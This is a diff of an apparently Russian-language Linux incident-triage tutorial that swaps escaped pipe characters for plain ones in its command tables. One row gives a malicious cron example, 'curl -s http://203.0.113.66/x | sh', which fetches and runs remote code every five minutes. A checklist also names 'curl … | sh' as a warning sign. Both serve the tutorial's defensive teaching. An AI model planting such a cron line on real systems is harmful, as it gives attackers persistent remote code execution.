@@ -374,9 +374,9 @@ find /tmp -mmin -60              # что менялось в /tmp за посл
 <td><code>echo "строка" &gt;&gt; report.txt</code></td>
 </tr>
 <tr>
-<td><code>\|</code></td>
+<td><code>|</code></td>
 <td>пайп: вывод одной команды идёт на вход другой</td>
-<td><code>grep Failed auth.log \| wc -l</code></td>
+<td><code>grep Failed auth.log | wc -l</code></td>
 </tr>
 </tbody>
 </table>
@@ -848,7 +848,7 @@ cat /etc/crontab
 <tbody>
 <tr>
 <td><code>0 3 * * * /usr/local/bin/backup.sh</code> — бэкап ночью, скрипт в обычном месте</td>
-<td><code>*/5 * * * * curl -s http://203.0.113.66/x \| sh</code> — каждые 5 минут качать и выполнять</td>
+<td><code>*/5 * * * * curl -s http://203.0.113.66/x | sh</code> — каждые 5 минут качать и выполнять</td>
 </tr>
 <tr>
 <td><code>/etc/cron.daily/logrotate</code> — пакетное задание ротации логов</td>
@@ -1209,7 +1209,7 @@ cat ssh_triage_report.txt
 </tr>
 <tr>
 <td>Топ значений поля</td>
-<td><code>grep … \| grep -oE "шаблон" \| sort \| uniq -c \| sort -rn \| head</code></td>
+<td><code>grep … | grep -oE "шаблон" | sort | uniq -c | sort -rn | head</code></td>
 </tr>
 <tr>
 <td>Найти файлы</td>
@@ -1233,7 +1233,7 @@ cat ssh_triage_report.txt
 </tr>
 <tr>
 <td>Процессы</td>
-<td><code>ps aux --sort=-%cpu \| head</code>, <code>top</code></td>
+<td><code>ps aux --sort=-%cpu | head</code>, <code>top</code></td>
 </tr>
 <tr>
 <td>Службы</td>
@@ -1253,7 +1253,7 @@ cat ssh_triage_report.txt
 </tr>
 <tr>
 <td>Тревога</td>
-<td>процесс или файл в <code>/tmp</code>, <code>kworker</code> без скобок, <code>curl … \| sh</code>, SUID в <code>/tmp</code></td>
+<td>процесс или файл в <code>/tmp</code>, <code>kworker</code> без скобок, <code>curl … | sh</code>, SUID в <code>/tmp</code></td>
 </tr>
 </tbody>
 </table>
